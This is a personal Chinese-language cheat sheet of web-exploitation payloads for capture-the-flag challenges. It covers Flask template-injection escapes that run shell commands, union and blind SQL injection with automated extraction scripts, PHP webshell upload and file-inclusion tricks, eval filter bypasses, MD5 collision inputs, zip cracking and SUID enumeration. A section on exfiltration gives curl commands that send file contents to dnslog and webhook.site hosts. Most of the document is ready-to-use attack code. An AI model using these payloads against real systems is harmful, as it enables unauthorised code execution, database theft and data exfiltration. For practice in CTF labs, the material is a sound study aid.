# [个人] 零基础的Web笔记



# Flask的SSTI模板注入沙箱逃逸
## 1. 查看内置函数组

```python
().__class__.__base__.__subclasses__()
```

```python
().__class__.__bases__[0].__subclasses__()
```

```python
getattr(().__class__.__base__, "__subclasses__")()
```

```python
getattr(().__class__.__bases__[0], "__subclasses__")()
```

找到函数`<class 'os._wrap_close'>`位于第`137`位

## 2. 调用内置函数

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__base__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__.popen("ls"+" "+"/").read()
```

```python
().__class__.__bases[0]__.__subclasses__()[137].__init__.__globals__["popen"]("ls"+" "+"/").read()
```

```python
exec("error=().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat'+' '+'/'+'f'+'l'+'a'+'g').read();raise Exception(f'{error}')")
```

```python
exec("error=\"abc\";raise Exception("abc")")
```

```python
{{lipsum.__globals__.os.popen('env').read()}}
```

```shell
{% print (cycler.next|attr(("%c"%95)*2+'globals'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2) (("%c"%95)*2+'builtins'+("%c"%95)*2)|attr(("%c"%95)*2+'getitem'+("%c"%95)*2)(("%c"%95)*2+'import'+ ("%c"%95)*2))('os').popen('cat /f*').read() %}
```



# SQL注入

## 1. 常规注入

### I. 确认注释类型

- #
- --
- --+

### II. 测试漏洞存在

```sql
' or true#
```

### III. 测试字段数量

```sql
' order by 3#
```

### IV. 查询数据库名称

```sql
' union select 1,2,table_schema from information_schema.tables#
```

### V. 查询数据表名称

```sql
' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### VI. 查询字段名称

```sql
' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### VII. 查询字段内容

```sql
' union select all 1,2,fl4g from secret_table#
```

### VIII.联表查询字段

```sql
' union select all null,null,null from users #
```



## 2. 函数注入

### I. 确认注释类型

- #

- --

- --+

### II. 测试漏洞存在

```sql
' or true --+
```

### III. 测试字段数量

```sql
' order by 3 --+
```

### IV. 查询数据库名称

```sql
' union select 1,2,database() --+
```

### V. 查询数据表名称

```sql
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
```

### VI. 查询字段名称

```sql
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
```

### VII. 查询字段内容

```sql
' union select 1,2,flag from test_tb --+
```



## 3. 宽体注入

### I. 确认注释类型

- #

- --

- --+

### II. 测试漏洞存在

```sql
%81' or true#
```

### III. 测试字段数量

```sql
%81' order by 3#
```

### IV. 查询数据库名称

```sql
%81' union select 1,2,table_schema from information_schema.tables#
```

### V. 查询数据表名称

```sql
%81' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### VI. 查询字段名称

```sql
%81' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### VII. 查询字段内容

```sql
%81' union select all 1,2,fl4g from secret_table#
```

### VIII. 联表查询字段

```sql
%81' union select all null,null,null from users #
```



## 4. 布尔盲注

### I. 确认注释类型

- #

- --

- --+

### II. 测试漏洞存在

```sql
' or true#
```

### III. 测试字段数量

```sql
' order by 3#
```

### IV. 查询数据库名称

```sql
' union select 1,2,table_schema from information_schema.tables#
```

### V. 查询数据表名称

```sql
' union select 1,2,table_name from information_schema.tables where table_schema='news'#
```

### VI. 查询字段名称

```sql
' union select 1,2,column_name from information_schema.columns where table_schema='news' and table_name='secret_table'#
```

### VII. 查询字段内容

```sql
' union select all 1,2,fl4g from secret_table#
```

### VIII. 测试盲注函数

#### ① 字符盲注

```sql
' union select all null,null,null from users where length(null) >= 10 #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" #
```

```sql
' union select all null,null,null from users where substr(null, 0, 4) == "flag" and substr(null, 4, 1) == "{" #
```

#### ② 数字盲注

```sql
1 and ascii(substr((select flag from flag_table limit 0,1),1,1))=109
```

```sql
1 and ascii(substr((select flag from flag_table limit 0,1),2,1))=111
```

```sql
1 and ascii(substr((select flag from flag_table limit 0,1),3,1))=101
```

```sql
1 and ascii(substr((select(database()) limit 1,1),1,1)=80
```

### VIIII. 编写盲注脚本

```python
import time
import requests
import fake_useragent

def getFlagFromSqlBlindBet(url: str, key: str = "id", field: str = "id", fieldLength: int = 1, table: str = "users", flagFormat: str = "flag{}", flagLength: int = 1, rightMark: str = "Right", isPost: bool = True, sleepTime: int = 100) -> str:

    # 初始化变量
    flag = flagFormat[:flagFormat.__len__() - 1]
    flagContentIndex = flagFormat.__len__()
    global response

    # 遍历 flag 长度
    while True:
        try:
            data = {key: rf"' union select all {field}{",null" * (fieldLength - 1)} from {table} where length({field}) >= {flagLength} --"}
            if isPost:
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
            else:
                response = requests.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)

            if response.content.decode().__contains__(rightMark):
                print(f"已遍历flag长度: {flagLength}")
                flagLength += 1
            else:
                flagLength -= 1
                print(f"找到flag长度: {flagLength}")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(sleepTime)

    # 遍历 flag 内容
    while flag.__len__() < flagLength - 1:
        i = 33
        while i < 126 + 1:
            try:
                data = {field: rf"' union select all {field}{", null" * (fieldLength - 1)} from {table} where substr({field}, 1, {flagFormat.__len__() - 1}) = '{flagFormat[:flagFormat.__len__() - 1]}' and substr({field}, {flagContentIndex}, 1) = '{chr(i)}' --"}
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
                if response.content.decode().__contains__("Right"):
                    flag += chr(i)
                    print(f"找到flag第{flagContentIndex}个字符为{chr(i)+"("+i+")"}: {flag + flagFormat[-1]}")
                    flagContentIndex += 1
                    break
                else:
                    print(f"已遍历flag第{flagContentIndex}个字符{chr(i)+"("+i+")"}")
                    i += 1
            except requests.exceptions.ConnectionError:
                time.sleep(sleepTime)
    flag += flagFormat[-1]

    print(f"得到flag: {flag}")
    return flag

if __name__ == "__main__":
    print(getFlagFromSqlBlindBet("http://fliaz.top:32864/", key = "username", field = "password", fieldLength = 5, table = "users", flagFormat = "pkwsec{}", flagLength = 44, rightMark = "Right"))
    
    
```

```python
import requests
import fake_useragent
from requests import Response

request = requests
session = requests.Session()

"""
Sync Get By Request
@param uri uri
@param params params
@param data data
@param headers headers
"""
def getByRequests(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return request.get(url = uri, headers = headers, params = params, data = data)

"""
Sync Post By Request
@param uri uri
@param params params
@param data data
@param headers headers
"""
def postByRequests(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return request.post(url = uri, headers = headers, params = params, data = data)

"""
Sync Get By Session
@param uri uri
@param params params
@param data data
@param headers headers
"""
def getBySession(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.get(url = uri, headers = headers, params = params, data = data)

"""
Sync Post By Session
@param uri uri
@param params params
@param data data
@param headers headers
"""
def postBySession(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.post(url = uri, headers = headers, params = params, data = data)

url = "http://8080-4ba89100-2eab-436f-9ddb-4ed6c3df35b3.challenge.ctfplus.cn/?project="
payload_database = f"1 and ascii(substr((select(database()) limit 1,1),"
payload_table = f"1 and ascii(substr((select table_name from `information_schema`.`tables` where table_schema='ctf2' limit 1,1),"
payload_column = f"1 and ascii(substr((select column_name from `information_schema`.`columns` where table_schema='ctf2' and table_name='secret_bids' limit 2,1),"
payload_element = f"1 and ascii(substr((select bid_price from secret_bids limit 0,1),"
payload_chosen = payload_element

flag = False
for i in range(1, 100):
    if flag: break
    payload_i = payload_chosen + f"{i},1))="
    for j in range(33, 127):
        payload_j = payload_i + f"{j}"
        response = getByRequests(url + payload_j).text
        if response.__contains__("YES"):
            print(chr(j), end="")
            break
        if j == 126: flag = True


```



# 文件上传漏洞

## 1. 前端校验

### I. 编写php文件

```php
<?=`ls`;
```

### II. 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

### III. BS抓包改后缀

```shell
png -> php
```



## 2. 后端校验

### I. phtml

#### 编写phtml文件

```
<?=`ls`;
```



### II. php

#### ① 编写php文件

```php
<?=`ls`;
```

#### ② 合成payload文件

```shell
copy /b png.png + php.php payload.png
```



## 3. 前后端校验

### I. phtml

#### ① 编写phtml文件

```
<?=`ls`;
```

#### ② 合成payload文件

```shell
copy /b png.png + phtml.phtml payload.png
```

##### ③ BS抓包改后缀

```shell
png -> phtml
```



### II. php

#### ① 编写php文件

```php
<?=`ls`;
```

#### ② 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

#### ③ 合成payload文件

```shell
copy /b png.png + php.php payload.png
```

#### ④ BS抓包改后缀

```shell
png -> php
```



# 文件包含漏洞

## 1. file协议

### 本地穿梭

```shell
?include=file://[文件的绝对路径和文件名]
```



## 2. php协议

### I. 文件内容读取

```shell
?include=php://filter/convert.base64-encode/resource=[文件路径]
```

### II 文件内容下载

```shell
?file=php://filter/zlib.deflate/resource=flag.php
```

```python
import base64
import zlib

data = "lZBRS8JgFIbv/RUf0u0wHftIWvOu/zHXzMBQsqsiaC2zZW4VUiaTUsqpkVoQjbnVn/nOt6+r/YW2f1AXBw6873vehyMWauVaaqVUkbfRBkrvVlVlv3RYxHxewLkcJ8tZgVvFON6wkuV4Po+31gSMFUE9Sq+nVKVcRenNJAyLN7DHxL346Q8j/xKsKbUNpk1p1wx7p8TzqNFmehDaLeZoYnFPAmNC3FasgeFQvRH5D/Dk0NEJ7c7FusSGL7Cw4HwJVzo1DeKdiZm6RAKbHTdA+6TNG/o+oJ2vGCKTQez7ns4+6G0TXu+StsAOO+MEoTtnzgisa3RQ2SkiMFuhP4npSPAI1pwsn4nbDmcDmOmR30sOxc/4y/zHWpBSvw=="

def b64_zlib_decode(b64_str: str) -> bytes:
    raw = base64.b64decode(b64_str)
    return zlib.decompress(raw, -15)

if __name__ == "__main__":
    print(b64_zlib_decode(data))
```



## 3. ZIP协议

### 压缩文件内容读取

```shell
?include=zip://[压缩包绝对路径]#[压缩包内文件]
```



## 4. data协议

### I. 执行命令

```shell
?include=data://text/plain,<?php phpinfo();?>
```

### II. 伪造文本

```shell
?include=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```


# MD5碰撞

## 1. 弱碰撞

### I. 0e绕过

#### ① 适用

```shell
a == md5(a)
```

#### ② 例子

```shell
0e215962017
```



### II. 长字符绕过

#### ① 适用

```shell
a != b && md5(a) == md5(b)
```

```
a !== b && md5(a) == md5(b)
```

#### ② 例子

```shell
QNKCDZO
240610708

s878926199a
s155964671a

s214587387a
s214587387a
```



### II. 数组绕过

#### ① 适用

```shell
a != b && md5(a) == md5(b)
```

```shell
a !== b && md5(a) == md5(b)
```

```shell
a != b && md5(a) === md5(b)
```

```shell
a !== b && md5(a) === md5(b)
```

#### ② 例子

```shell
a[] = 0
b[] = 1
```



### III. 单md5特定

#### ① 字符

##### (1) 适用

```shell
md5(x)=="y"
```

##### (2) 脚本

```python
import hashlib, random, string

y = '666'
while 1:
    x = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
    h = hashlib.md5(x.encode()).hexdigest()
    if h.startswith(y) and not h[3].isdigit() or h.startswith('0'+y) and not h[4].isdigit():
        print(f"md5({x}) === {h} == {y}")
        break
        
        
```

#### ② 数字

##### (1) 适用

```shell
md5(x)==y
```

##### (2) 脚本

```python
import hashlib, random, string
from multiprocessing import Pool, cpu_count

PREFIX = '0e'     # 想找别的就改这里
DIGITS = True     # True=前缀后必须全数字(魔法哈希); False=只要前缀匹配即可
A = string.ascii_letters + string.digits

def f(_):
    while True:
        x = ''.join(random.choices(A, k=8))
        h = hashlib.md5(x.encode()).hexdigest()
        if h.startswith(PREFIX) and (not DIGITS or h[len(PREFIX):].isdigit()):
            return x, h

if __name__ == '__main__':
    with Pool(cpu_count()) as p:
        x, h = next(p.imap_unordered(f, range(cpu_count())))
    print(f"md5({x}) === {h}  前缀={PREFIX!r} 纯数字={DIGITS}")
```



### IV. 双md5特定

#### ① 适用

```shell
md5(md5(x))==y
```

#### ② 脚本

```python
import hashlib, random, string

y = '666'
while 1:
    x = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
    h = hashlib.md5(hashlib.md5(x.encode()).hexdigest().encode()).hexdigest()
    if h.startswith(y) and not h[3].isdigit() or h.startswith('0'+y) and not h[4].isdigit():
        print(f"md5(md5({x})) === {h} == {y}")
        break
        
        
```



## 2. 强碰撞

### I. 碰撞绕过

#### ① 适用

```shell
(string)a != (string)b && md5(a) === md5(b)
```

```shell
(string)a !== (string)b && md5(a) === md5(b)
```

#### ② 例子

```shell
psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2

psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
```

```shell
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

```shell
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1

%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```



# Http请求

## I. 从某浏览器

### 例子

```shell
User-Agent WLLM
```



## II. 从某地址

### 例子

```shell
X-Forwarded-For 127.0.0.1
```



## III. 从某网址

### 例子

```shell
Referer ?CTF
```



## IV. 从某时间

### 例子

```shell
Data Tue, 27 Aug 2024 05:00:00 GMT
```



# Url编码

## I. 规则

```python
'%' + hex(ord(chr))
```

**分析**

- 字符转ASCII 码 / Unicode 码
- 转16进制
- 去首"0x"然后首补'%'

## II. 公式

```python
def urlEncode(encodeStr: str) -> str:
    encodeResult = ''
    for encodeChar in encodeStr:
        encodeResult += '%' + str(hex(ord(encodeChar))).replace("0x", '')
    return encodeResult

def urlDecode(decodeStr: str) -> str:
    decodeResult = ''
    for encodeChar in decodeStr.split('%')[1:]:
        decodeResult += (chr(int("0x" + encodeChar, 16)))
    return decodeResult


```



# 爬虫

## 脚本

```python
import requests
import fake_useragent
from requests import Response

request = requests
session = requests.Session()

"""
Sync Get By Request
@param uri uri
@param params params
@param data data
@param headers headers
"""
def getByRequests(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return request.get(url = uri, headers = headers, params = params, data = data)

"""
Sync Post By Request
@param uri uri
@param params params
@param data data
@param headers headers
"""
def postByRequests(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return request.post(url = uri, headers = headers, params = params, data = data)

"""
Sync Get By Session
@param uri uri
@param params params
@param data data
@param headers headers
"""
def getBySession(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.get(url = uri, headers = headers, params = params, data = data)

"""
Sync Post By Session
@param uri uri
@param params params
@param data data
@param headers headers
"""
def postBySession(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.post(url = uri, headers = headers, params = params, data = data)
```

```python
import aiohttp
import fake_useragent
from aiohttp import ClientTimeout, ClientError, ClientResponse

"""
Async Get By Session
@param uri uri
@param params params
@param data data
@param headers headers
@param session session
@param timeout timeout
@param attempts attempts
@return: response
"""
async def async_get(uri: str, params: dict, data: dict, headers: dict = None, session: aiohttp.ClientSession = None, timeout: int = 60, attempts: int = 10) -> ClientResponse | None:
    if headers is None:
        headers = {"User-Agent": fake_useragent.UserAgent().random}
    if session is None:
        async with aiohttp.ClientSession() as clientSession: session = clientSession

    for attempt in range(attempts):
        try:
            async with session.get(
                    url=uri,
                    params=params,
                    data=data,
                    headers=headers,
                    timeout=ClientTimeout(total=timeout)
            ) as response:
                return await response
        except ClientError as clientError:
            if attempt + 1 == attempts:
                print(f"{clientError}")
    return None

"""
Async Post By Session
@param uri uri
@param params params
@param data data
@param headers headers
@param session session
@param timeout timeout
@param attempts attempts
@return: response
"""
async def async_post(uri: str, params: dict, data: dict, headers: dict = None, session: aiohttp.ClientSession = None, timeout: int = 60, attempts: int = 10) -> ClientResponse | None:
    if headers is None:
        headers = {"User-Agent": fake_useragent.UserAgent().random}
    if session is None:
        async with aiohttp.ClientSession() as clientSession: session = clientSession

    for attempt in range(attempts):
        try:
            async with session.post(
                    url=uri,
                    params=params,
                    data=data,
                    headers=headers,
                    timeout=ClientTimeout(total=timeout)
            ) as response:
                return await response
        except ClientError as clientError:
            if attempt + 1 == attempts:
                print(f"{clientError}")
    return None


```



# MD5

## 脚本

```python
import hashlib

def md5(content: str)->str:
    hex = hashlib.md5()
    hex.update(content.encode())
    return hex.hexdigest()


```



# 反弹Shell

## I. Dnslog

### 公式

```shell
curl `cat /f*`.ociqfw.dnslog.cn
```



## II. Webhook

### 公式

```shell
curl https://webhook.site/#!/view/f9280e85-7baa-4f28-8689-4d20879c0792/`cat /f*`
```



## III. Ngrok

### 公式

```powershell
python -m http.server 8080 --directory "C:\Users\probie\Desktop"
```

```cmd
ngrok http 8080
```



# 零宽隐写

## 公式

```python
s = """if ( "admin" == $_GET['cytcv'] && /*⁦⁩*/ "bmkfd⁩ncd" == $_GET['⁦fguyfnk⁩kef']){"""
print(repr(s))
```



# Uni码转Url码

## 公式

```python
import urllib.parse

s = "\u2069"
print(urllib.parse.quote(s))
```



# 魔术链

## __toString()

对象被当作字符串使用时触发。 触发场景：`echo $obj`、`print $obj`、字符串拼接、`strlen($obj)`、`file_exists($obj)` 等。 POP 链作用：常用跳板，把对象传入字符串上下文，继续向下触发其他 gadget。

## __destruct()

析构函数，对象引用计数归零、脚本结束、对象销毁时触发。 触发场景：unserialize 得到对象，脚本执行完毕；变量被 unset。 POP 链作用：**最常见 POP 入口**，整条链的起点。

## __wakeup()

unserialize () 恢复对象时自动调用。 触发场景：`unserialize()`执行阶段，反序列化重建对象后立即触发。 考点：CVE-2016-7124，序列化串中声明属性数大于真实属性数，可绕过__wakeup（PHP5<5.6.25 / PHP7<7.0.10）；PHP7.4 + 若同时存在__unserialize ()，优先执行__unserialize，不再执行__wakeup。

## __unserialize()

PHP7.4 + 新增，unserialize 时触发，接收数组参数。 优先级高于__wakeup，同类两个方法共存只执行__unserialize。

## __sleep()

`serialize()`序列化对象前触发。 返回数组，数组内元素为需要序列化保存的属性；用于清理资源。 POP 链一般不作为入口，少数题目用来修改序列化存储属性。

## __invoke()

对象被当作函数调用时触发。 触发场景：`$obj()`、`call_user_func($obj)`、`usort($arr,$obj)`。 POP 链作用：常用中间跳板，回调场景高频出现。

## __call()

对象实例中调用**不存在 / 不可访问**的方法时触发。 参数：第一个为方法名，第二个为参数数组。 触发场景：`$obj->notexist(1,2)`。 POP 链作用：非常核心跳板，调用不存在方法进入链，SoapClient 原生类 SSRF 就是利用此方法。

## __callStatic()

静态上下文调用不存在 / 不可访问的静态方法触发。 触发场景：`A::notexist()`。 POP 出现频率低于__call。

## __get()

读取**不存在 / 不可访问（private/protected）**属性时触发。 参数：要读取的属性名。 触发场景：`$obj->noexist`。 POP 链高频跳板，读取私有 / 不存在属性触发下一环。

## __set()

给不存在 / 不可访问属性赋值触发。 参数：属性名、赋值的值。 触发场景：`$obj->noexist = "xxx"`。

## __isset()

对不存在 / 不可访问属性执行`isset()`或`empty()`触发。 触发场景：`isset($obj->noexist)` / `empty($obj->noexist)`。

## __unset()

对不存在 / 不可访问属性执行 unset 触发。 触发场景：`unset($obj->noexist)`。

## __construct()

构造函数，`new 类名()`实例化对象时触发。 ⚠️ 序列化 / 反序列化**不会自动触发**，仅 new 新建对象才跑；POP 链一般不作为自动入口。

## __clone()

clone 克隆对象完成后触发。 触发场景：`$b = clone $a`；克隆后对新对象执行。



# 无字母无数字绕过

## 1. PHP

### I. 例子

```php
<?php
highlight_file(__FILE__);
$code=$_GET['code'];
if(preg_match('/[a-z0-9]/i',$code)){
    die('hacker');
}
eval($code);
```

```shell
用反码绕过
```

### II. 公式

```php
<?php 
$payload=urlencode(~'eval($_POST[0]);');
echo $payload;
```

```shell
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
```



## 2. Python

### I. 例子

```python
import re

code = input('code: ')
if re.search(r'[a-zA-Z0-9]',code):
    return
exec(code)
```

```shell
用全角绕过
```

### II. 公式

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("127.0.0.1", 10477)

payload = "ｅｘｅｃ(ｉｎｐｕｔ())".encode()
r.sendlineafter("code:".encode(), payload)

cmd = f"import os; print(os.popen(\"{input()}\").read())".encode()
r.sendline(cmd)

r.interactive()
r.close()
```



# 已知明文攻击

## 公式

```shell
bkcrack -C flag.zip -c flag.txt -p m.txt -o 0
5663cf28 b2646412 8783f79c

bkcrack -C flag.zip -c flag.txt -k 5663cf28 b2646412 8783f79c -d flag.txt
flag{}
```



# SUID

## 公式

```shell
find / -perm -4000 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
```

